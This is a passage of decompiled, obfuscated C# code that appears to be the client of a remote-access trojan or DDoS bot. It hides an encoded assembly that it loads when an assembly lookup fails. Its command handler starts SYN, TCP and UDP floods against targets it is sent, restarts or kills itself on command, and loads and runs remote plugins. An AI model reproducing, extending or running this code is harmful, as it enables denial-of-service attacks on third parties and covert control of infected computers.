		if ((int)e.get_Reason() == 2 && Class8.bool_0)
		{
			Class12.smethod_0();
		}
	}

	private static void smethod_5(object object_0, IPlugin iplugin_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			iplugin_0.add_ExecutionComplete((EventHandler)smethod_15);
			iplugin_0.add_Output(new OutputEventHandler(smethod_14));
			iplugin_0.add_Started((EventHandler)smethod_13);
			iplugin_0.add_Stopped((EventHandler)smethod_12);
			GClass1.sortedList_1[iplugin_0.get_Guid()] = iplugin_0;
		}
		catch
		{
		}
	}

	private static Assembly smethod_6(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		return Assembly.Load(Encoding.GetEncoding(1252).GetBytes(Class0.smethod_3("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9vN5C6fz/fP98/Pz8/P287n0rfMD8//z8/Pz8/bzufTP8wvzAfPz8/Pz9vO59NvzF/MF8/Pz8/P283kLp/P98wbz8/Pz8/bzufSt8wPzCPPz8/Pz9vO59M/zC/MK8/Pz8/P287n02/MX8w7zQxPz8/PzeQun80DzD/NbE/Pz8/OJ86L0TPMP88MT8/Pz84nzrPRT8xDzIhTz8/PzeQun80DzEfPz8/Pz8/O5ALj0WvMR8/Pz8/Pz87kAwfRa8xHz8/Pz8/PzuQDR9FrzEfPz8/Pz8/O5ANz0XvMR8/Pz8/Pz87kA7fRj8xHz8/Pz8/PzuQAF9WPzEfPz8/Pz8/O5ABf1Y/MR8ysU8/Pz83n7I/Vn8xHzQhTz8/Pzefs59WzzEfPz8/Pz8/O5AFf1cvMS8/Pz8/Pz87kAffV38xLzSxTz8/PzefuL9XzzEvNiFPPz8/N5+5v1gPMS82sU8/Pz83n7q/WF8xPz8/Pz8/Pzufi09UDzE/Pz8/Pz8/O5+L/1ivMT88EU8/Pz87n0x/WA8xXzxxTz8/Pzefvr9ZXzFvMDFfPz8/N5+wH2lfMX8z8V8/Pz83n7IvaV8xjzexXz8/Pzefsu9pXzGfO3FfPz8/N5+0X2lfMa8/MW8/Pz83n7UfaV8xvzLxbz8/Pzeftm9p/zHPNrFvPz8/N5+3D2n/Md86cW8/Pz83n7hPap8x7z4xbz8/PzefuP9qnzH/MfF/Pz8/N5+6b2s/Mg81sX8/Pz83n7s/az8yHzlxfz8/PzefPD9rnzIvPnF/Pz8/N588j2bPMk8xMY8/Pz83nz0/ZA8yXzPxjz8/PzdPPc9kDzJfOTGPPz8/N3C6fzQPMl8/Pz9POV9/Pz9fOc9/Pz9POj9/Pz9fPc9vPz9POj9/Pz9fPc9vPz9vOq9/Pz9/OV9/Pz9POz9/Pz9POV9/Pz9fOc9/Pz9POj9/Pz9fPc9vPz9POj9/Pz9fPc9vPz9vOq9/Pz9/OV9/Pz9POz9/Pz9POV9/Pz9fOc9/Pz9POj9/Pz9fPc9vPz9POj9/Pz9fPc9vPz9vOq9/Pz9/OV9/Pz9POz9/Pz9PO69/Pz9PO/9/Pz9PPB9/Pz9PPB9/Pz9PPH9/Pz9fPc9vPz9PPH9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPT9/Pz9fPc9vPz9PPc9lzzp/Pt82Tzp/Pt82zzp/Pt83Tzp/Pt83zzp/Pt84Tzp/Pt84zzp/Pt85Tzp/Pt85zzp/Py86Tzp/Pt86zzp/Pt87Tzp/Pt87zzp/P39Mzzp/P99NTzp/NA89zzp/NA8wzzp/NA8//zp/NA8zzzp/NA8zTzp/NA8zTzovQI9OTz5vlA8zzz7PkP9OTz9PpA8zzzp/Mb9DTzrPQh9Ozzp/NA8wzzHPo39Pz0Lfo99PT0S/pG9Pz0XfpP9KTzcfpa8yTzp/Pt8yTze/o18wz0ivpg9BT0r/ps9Az0v/pg9FTzrfO/9Pvz+/Mk8/vz//Mp8/vzB/Mk8/vzC/Mp8yHzFvP09SHzbvNp9SHzJvMB9SHzZvNg9SHz/vPH9CHzBvPT9CHzDvPu9CHzHvPH9CHzLvPu9CHzPvPu9CHzRvMg9SHzVvNK9SHzXvNX9TT1zvMp81T1zvMp8/P2zvMp8xP2zvMp83P2zvMp85P2zvMp8xT0J/Qu9DP0WPR+9I30nPSr9LX0u/T88/Tz8/PZ9STz8/Ma9iTz8/M99iTz8/Ng9v/z8/N99vvz8/Od9gPz/PP08/PzHvfI8/PzI/fI8/PzL/fI8/PzNvfM8/PzQ/fR8/PzV/fR8/PzZffR8/PzbffV8/PzT/Xa8/Pzf/ff8/Pziffk8/PzD/To8wPzFvP18/vzFfP18/XzBPP28wPzGPP38/vzF/P38/XzBfP48/vzGfP58wPzGvP58/XzBvP68wPzHPP78/vzG/P78/XzB/P88wPzHvP98/vzHfP98/XzCPP+8wPzIPP/8/vzH/P/8/XzCfMA8/XzCvMC8/XzC/ME8/TzDPME8/XzDfMG8/XzDvMI8/TzEPMK8/XzD/MK8/XzEfMM8wL093Pz8/Tz8/Pz8/Pz8/Pz8/PzcfPz8/Xz8/Pz8/Pz8/Pz8/TzefPz8/Pz9fPz8/Pz8/Pz8/Pz9PNj9fPz8/M883n0PPOI9Dzzl/Q886b08/PzL0BiV2hfWDHzPENfaFpcYSFXX1/zQmhnY2hnOGlYYWc7VGFXX1hl80NfaFpcYfM8YWNoZzhpWGFnO1RhV19YZfNFWFZYXGlYVzhpWGFnO1RhV19YZfNDX2haXGFGZ1RnWPNGXFdY80NfaFpcYTRlWmbzRlhlXFRfXG1YZfM8Q19oWlxh82BmVmJlX1xV80ZsZmdYYPNAaF9nXFZUZmc3WF9YWlRnWPM4YWhg80JVXVhWZ/MhVmdiZfM8YWliXljzPDRmbGFWRVhmaF9n8zRmbGFWNlRfX1VUVl7zNVhaXGE8YWliXljz80Nz9jhhVzxhaWJeWPNpVF9oWFJS80FCQTjzRUhBQTxBOvM2Pzw4QUfzRjhFSThF8ztYVFdYZfM6aFxX80NfaFpcYTpoXFfzRmxmZ1hgITZiX19YVmdcYmFmITpYYVhlXFbzP1xmZ1Mk8zdUZ1TzRmxmZ1hgIUVoYWdcYFghRlhlXFRfXG1UZ1xiYSE5YmVgVGdnWGVmITVcYVRlbPM1XGFUZWw5YmVgVGdnWGXzVVnzRmxmZ1hgITxC80BYYGJlbEZnZVhUYPNgZvNGWGVcVF9cbVjzN1hmWGVcVF9cbVjzWlhnUkFUYFjzWlhnUjdYZlZlXGNnXGJh81pYZ1I0aGdbYmXzWlhnUjZoZWVYYWdGZ1RnWPNaWGdSRmdiY0JhN1xmVmJhYVhWZ1xiYfNaWGdSOGtYVmhnWEJhP2JUV/NaWGdSO1RmOWJlYPNaWGdSOGtYVmhnWEJhP2JUVzRlWmbzZlhnUjhrWFZoZ1hCYT9iVFc0ZVpm80lYZWZcYmHzWlhnUklYZWZcYmHzRmxmZ1hgIUpcYVdiamYhOWJlYGbzOWJlYPNaWGdSPGFjaGc5YmVg81pYZ1JGZ1RnWEJVXVhWZ/NmWGdSRmdUZ1hCVV1YVmfzWlhnUjpoXFfzPGFcZ1xUX1xtWPM4a1hWaGdY80ZnYmPzOGlYYWc7VGFXX1hl8zhrWFZoZ1xiYTZiYGNfWGdY81RXV1I4a1hWaGdcYmE2YmBjX1hnWPNlWGBiaVhSOGtYVmhnXGJhNmJgY19YZ1jzRmdUZWdYV/NUV1dSRmdUZWdYV/NlWGBiaVhSRmdUZWdYV/NGZ2JjY1hX81RXV1JGZ2JjY1hX82VYYGJpWFJGZ2JjY1hX8zxhY2hn81RXV1I8YWNoZ/NlWGBiaVhSPGFjaGfzQmhnY2hn81RXV1JCaGdjaGfzZVhgYmlYUkJoZ2NoZ/NFWFZYXGlYV/NUV1dSRVhWWFxpWFfzZVhgYmlYUkVYVlhcaVhX80ZYYVfzQmFFWFZYXGlYV/M4a1hWaGdYV/NY8y84a1hWaGdYQmE/YlRXNGVaZjFeUlI1VFZeXGFaOVxYX1fzL0ZnVGdYQlVdWFZnMV5SUjVUVl5cYVo5XFhfV/NBVGBY8zdYZlZlXGNnXGJh8zRoZ1tiZfM2aGVlWGFnRmdUZ1jzRmdiY0JhN1xmVmJhYVhWZ1xiYfM4a1hWaGdYQmE/YlRX8ztUZjliZWDzOGtYVmhnWEJhP2JUVzRlWmbzPGFjaGc5YmVg80ZnVGdYQlVdWFZn82JVXVhWZ/NgWGdbYlfzZlhhV1hl81ZUX19VVFZe82VYZmhfZ/NUZVpm81XzaVRfaFjzZmdUZ1hCVV1YVmfzZlxXWPNGbGZnWGAhRVhZX1hWZ1xiYfM0ZmZYYFVfbEdcZ19YNGdnZVxVaGdY8zRmZlhgVV9sN1hmVmVcY2dcYmE0Z2dlXFVoZ1jzNGZmWGBVX2w2YmFZXFpoZVRnXGJhNGdnZVxVaGdY8zRmZlhgVV9sNmJgY1RhbDRnZ2VcVWhnWPM0ZmZYYFVfbENlYldoVmc0Z2dlXFVoZ1jzNGZmWGBVX2w2YmNsZVxaW2c0Z2dlXFVoZ1jzNGZmWGBVX2xHZVRXWGBUZV40Z2dlXFVoZ1jzNGZmWGBVX2w2aF9naGVYNGdnZVxVaGdY80ZsZmdYYCFFaGFnXGBYITxhZ1hlYmNGWGVpXFZYZvM2YmBJXGZcVV9YNGdnZVxVaGdY8zpoXFc0Z2dlXFVoZ1jzNGZmWGBVX2xJWGVmXGJhNGdnZVxVaGdY8zRmZlhgVV9sOVxfWElYZWZcYmE0Z2dlXFVoZ1jzRmxmZ1hgITdcVFphYmZnXFZm8zdYVWhaWlRVX1g0Z2dlXFVoZ1jzN1hVaFpaXGFaQGJXWGbzRmxmZ1hgIUVoYWdcYFghNmJgY1xfWGVGWGVpXFZYZvM2YmBjXF9UZ1xiYUVYX1RrVGdcYmFmNGdnZVxVaGdY80VoYWdcYFg2YmBjVGdcVVxfXGdsNGdnZVxVaGdY80ZYZVxUX1xtVFVfWDRnZ2VcVWhnWPNGZ2VYVGDzNl9iZljzR2I0ZWVUbPM3XGZjYmZY8zZiYGNcX1hlOlhhWGVUZ1hXNGdnZVxVaGdY80dsY1jzOlhnR2xjWPM0ZmZYYFVfbPM6WGc0ZmZYYFVfbPNFaGFnXGBYR2xjWDtUYVdfWPM6WGdHbGNYOWViYDtUYVdfWPM6WGc2aGZnYmA0Z2dlXFVoZ1hm81pYZ1JJVF9oWPM4YGNnbPM3WF9YWlRnWPM2YmBVXGFY80ZsZmdYYCFHW2VYVFdcYVrzPGFnWGVfYlZeWFfzNmJgY1RlWDhrVltUYVpY80VYYGJpWPM4aVhhZzRlWmbz8/Pz8/YT8/Pz8/PHEKLXQcOdNIsSnhdbICk18/uqbU9JDCfTfPgT9fQPC/oT9fQFFwUP/hP3BQQFFwUPBQgP+BP09AUE9fn79vkEB/fz8/Pz9/Tz8/P2+QQL9fkB9vkEDPn5CAUQ9A/2E/P09vkFFPb5BRj58/QQ+AUP+fP0BQ8Q+PYT8wH3E/MEB/YT8/X3E/MFD/gT9PQFD/cT8wUc9xPzBSD2E/MP9xP09A/3E/MEDPkT9fQPBQ/2+QUk+BP09AUk9vkF//gT9PQF//b5Bfv4E/T0Bfv2+QUD+BP09AUD+hP19AQLBQ/2+QUP9fkP9hvzAfcb8wQH9hvz9fcb8wUP9xvzBRz3G/MFIPYb8w/3G/MEDPcT9PQB9xP09PX4E/T0BFz3E/T0+/gIBRD0D/kT9fQFbA/3E/MQ+Pn69RD4EPj4E/T0EPj4E/QPBWz5+vUFDwUP9/r0BQ/2+vQP+BPzBXN0+/P0BXN4BXN0+/P0BXN0BHN8+xP1EA8Fc3T1+vr2EA8EDPX+8/UFc4AFc4AFc4D/A/T2EfMDEfMR8xHz9/30BST8+vcFJAUkBST19/30Bf/8+vcF/wX/Bf/19/30Bfv8+vcF+wX7Bfv19/30BQP8+vcFAwUDBQP1+Pr1BAv19vr09foT9fQPBXOI/vTz+UNfaFpcYfPzDfTzCEFYZyBKWFRpWBNDX2haXGETNVRmWPPz+PTz8/Pz//Tz+mtGXF9YYWfz8xH08ww2YmNsZVxaW2cTtZwTa0ZcX1hhZxMlIyQk8/Mc9PMXKiYpVCdYIyggVlUsWCAnVShZICxXVyggJVRWKSxYWVYjVyws8/P/9PP6JCEjISMhI/Pz+/Tz+vTz8/Pz+/Tz+/Pz8/PzEfTz9PNH9QlKZVRjQWJhOGtWWGNnXGJhR1tlYmpm9PPz8/Pz8/MuwX9B8/Pz8/Xz8/Nt8/Pztyzz87cO8/NFRjdGY2p7se1f80B2pwD+Vx1mpPXz8/M2LU9IZlhlZk9BVGdbVGFPN2JWaGBYYWdmT0lcZmhUXxNGZ2hXXGITJSMkI09DZWJdWFZnZk9DZWJdWFZnEzc3YkZYZU9DX2haXGFPYlVdTzdYVWhaTzxDX2haXGEhY1dV8/PzWy3z8/Pz8/Pz8/PzcS3z8/MT8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz82Mt8/Pz8/Pz8/NSNmJlN19fQFRcYfNgZlZiZVhYIVdfX/Pz8/Pz8hjzEzPz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz9PMD8/PzC/Pzc/Pz8/Pz8/Pz8/Pz8/Pz9PP08/PzI/Pzc/Pz8/Pz8/Pz8/Pz8/Pz9PPz8/PzO/Pz80sz8/MX9vPz8/Pz8/Pz8/MX9ifz8/NJ80bzUvNJ8zjzRfNG8zzzQvNB81LzPPNB8znzQvPz8/PzsPfi8fPz9PPz8/Tz8/Pz8/Pz9PPz8/PzMvPz8/Pz8/P38/Pz9fPz8/Pz8/Pz8/Pz8/Pz8zfz8/P080nzVPNl8znzXPNf81jzPPNh81nzYvPz8/PzF/P38/PzR/Nl81TzYfNm81/zVPNn81zzYvNh8/Pz8/Pz86P3d/Xz8/TzRvNn82XzXPNh81rzOfNc81/zWPM882HzWfNi8/PzU/Xz8/TzI/Mj8yPzI/Mj8yfzVfMj8/PzN/MJ8/TzNvNi82DzYPNY82HzZ/Nm8/PzQfNY82fzIPNK81jzVPNp81jzE/ND81/zaPNa81zzYfMT8zXzVPNm81jz8/Mj8/vz9PM282LzYPNj81TzYfNs80HzVPNg81jz8/Pz82vzRvNc81/zWPNh82fz8/Mr8/rz9PM581zzX/NY8zfzWPNm81bzZfNc82PzZ/Nc82LzYfPz8/PzQ/Nf82jzWvNc82Hz8/Pz8yPz+/P08znzXPNf81jzSfNY82XzZvNc82LzYfPz8/PzJPMh8yPzIfMj8yHzI/Pz8yvz//P08zzzYfNn81jzZfNh81TzX/NB81TzYPNY8/PzPPND81/zaPNa81zzYfMh81fzX/Nf8/PzS/MM8/TzP/NY81rzVPNf8zbzYvNj82zzZfNc81rzW/Nn8/PzNvNi82PzbPNl81zzWvNb82fzE/Oc8xPza/NG81zzX/NY82HzZ/MT8yXzI/Mk8yTz8/Pz8zPz//P080LzZfNc81rzXPNh81TzX/M581zzX/NY82HzVPNg81jz8/M880PzX/No81rzXPNh8yHzV/Nf81/z8/Mj8/rz9PND82XzYvNX82jzVvNn80HzVPNg81jz8/Pz80PzX/No81rzXPNh8/Pz8/Mn8/vz9PND82XzYvNX82jzVvNn80nzWPNl82bzXPNi82Hz8/Mk8yHzI/Mh8yPzIfMj8/PzK/P78/TzNPNm82bzWPNg81XzX/Ns8xPzSfNY82XzZvNc82LzYfPz8yTzIfMj8yHzI/Mh8yPz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/PzI/Pz//Pz84Mt8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8w==", bool_0: true)));
	}

	private static void smethod_7(string string_1)
	{
	}

	private static void smethod_8(object sender, EventArgs1 e)
	{
		//IL_045d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0463: Invalid comparison between Unknown and I4
		Class3 @class = sender as Class3;
		try
		{
			Class2 class2 = new Class2(e.Byte_0);
			switch (e.Enum0_0)
			{
			case Class3.Enum0.const_1:
				if (Class14.Boolean_0)
				{
					@class.method_9(Class14.String_0 + " Flood Already Active");
					return;
				}
				Class14.smethod_0(Class14.Enum3.const_1, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class14.smethod_1();
				@class.method_9("SYN Flood Active");
				break;
			case Class3.Enum0.const_2:
				if (Class14.Boolean_0)
				{
					@class.method_9(Class14.String_0 + " Flood Already Active");
					return;
				}
				Class14.smethod_0(Class14.Enum3.const_0, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class14.smethod_1();
				@class.method_9("TCP Flood Active");
				break;
			case Class3.Enum0.const_3:
				if (Class14.Boolean_0)
				{
					@class.method_9(Class14.String_0 + " Flood Already Active");
					return;
				}
				Class14.smethod_0(Class14.Enum3.const_2, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class14.smethod_1();
				@class.method_9("UDP Flood Active");
				break;
			case Class3.Enum0.const_4:
				if (Class14.Boolean_0)
				{
					Class14.smethod_2();
					@class.method_9(Class14.String_0 + " Flood Inactive");
				}
				else
				{
					@class.method_9("No Flood Active");
				}
				break;
			case Class3.Enum0.const_5:
			{
				object[] parameter2 = new object[2]
				{
					class2.ReadString(),
					sender
				};
				new Thread(smethod_16).Start(parameter2);
				break;
			}
			case Class3.Enum0.const_6:
			{
				object[] parameter = new object[3]
				{
					class2.ReadString(),
					class2.ReadString(),
					sender
				};
				new Thread(smethod_17).Start(parameter);
				break;
			}
			case Class3.Enum0.const_7:
				try
				{
					Class11.smethod_1();
					@class.method_10(bool_2: false);
					Process.Start(Process.GetCurrentProcess().MainModule!.FileName);
					Process.GetCurrentProcess().Kill();
				}
				catch
				{
					(sender as Class3).method_9("Restart Failed");
				}
				break;
			case Class3.Enum0.const_8:
			{
				string @string = Encoding.Default.GetString(e.Byte_0);
				if (@string != Encoding.Default.GetString(Class0.smethod_1(Convert.FromBase64String(Class8.string_10), bool_0: false)))
				{
					(sender as Class3).method_9("Invalid password");
					return;
				}
				if (Class8.bool_0)
				{
					foreach (GClass2 item in list_0)
					{
						item.method_3();
					}
					Class12.smethod_4();
				}
				Process.GetCurrentProcess().Kill();
				break;
			}
			case Class3.Enum0.const_9:
				try
				{
					if (GClass1.smethod_3(Encoding.GetEncoding(1252).GetBytes(class2.ReadString())))
					{
						string text = GClass1.sortedList_1.Values[GClass1.sortedList_1.Count - 1].get_Name() + " Stored";
						if (Class8.bool_0)
						{
							text += " and Saved";
							GClass1.smethod_0();
						}
						@class.method_9(text);
						break;
					}
					throw new Exception(GClass1.smethod_6());
				}
				catch (Exception)
				{
					@class.method_9("Plugin Error: Invalid or Already Loaded");
				}
				break;
			case Class3.Enum0.const_10:
				try
				{
					PluginArgs val = Serializer.Deserialize(e.Byte_0);
					if (!GClass1.sortedList_1.ContainsKey(val.PluginGuid))
					{
						@class.method_9("Plugin not found");
						break;
					}
					IPlugin iplugin_ = GClass1.sortedList_1[val.PluginGuid];
					GClass1.smethod_7(sender, iplugin_, val);
				}
				catch (Exception ex)
				{
					@class.method_9("Failed Plugin Execution: " + ex.Message);
				}
				break;
			case Class3.Enum0.const_11:
				try
				{
					Guid guid = new Guid(class2.ReadString());
